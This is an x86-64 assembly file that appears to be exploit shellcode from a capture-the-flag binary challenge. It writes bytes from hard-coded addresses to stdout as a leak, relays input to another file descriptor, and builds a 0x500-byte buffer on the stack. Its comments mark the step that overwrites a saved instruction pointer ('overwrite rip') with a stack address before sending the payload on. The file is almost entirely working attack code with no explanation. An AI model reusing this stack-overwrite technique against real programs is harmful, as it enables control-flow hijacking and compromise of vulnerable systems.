%define FD 4
section .text
global _start
_start:
	lea r9, [rsp-0x100]	<------ save stack
        mov qword rsi,0x602070 
        mov edi, 1
        mov qword rax, 1
        mov qword rdx, 8
        syscall
	
	mov qword rsi, 0x602068
	mov edi, 1
	mov qword rax, 1
	mov qword rdx, 8
	syscall

        mov rax, 1                                                                                                    
        mov edi, 1                                                                                                    
        mov qword rsi,0x4011f4                                                                                        
        mov rdx, 4                                                                                                    
        syscall                                                                                                       
                                                                                                                      
        xor rax, rax                                                                                                  
        xor edi, edi                                                                                                  
        mov qword rdx, 4                                                                                              
        mov qword rsi, 0x602008                                                                                       
        syscall                                                                                                       
                                                                                                                      
        mov qword rax, 1                                                                                              
        mov edi, FD                                                                                                   
        mov qword rsi, 0x602008                                                                                       
        mov qword rdx, 4                                                                                              
        syscall
	
	sub rsp, 0x600
	mov rax, 0
	mov edi, 0
	mov rsi, rsp
	mov rdx, 0x500
	syscall
	mov qword [rsp+0x234], r9 <-------- overwrite rip
	mov qword rax, 1                                                                                              
        mov edi, FD                                                                                                   
        mov qword rsi, rsp                                                                                            
        mov qword rdx, 0x500                                                                                          
        syscall                                                                                                       
        add rsp, 0x600                                                                                                
                                                                                                                      
        xor rax, rax                                                                                                  
        xor edi, edi                                                                                                  
        mov qword rsi, 0x6020b8                                                                                       
        mov rdx, 119                                                                                                  
        syscall                                                                                                       
                                                                                                                      
        mov qword rax, 1                                                                                              
        mov edi, 1                                                                                                    
        mov qword rsi, 0x6020B8                                                                                       
        mov qword rdx, 119                                                                                            
        syscall
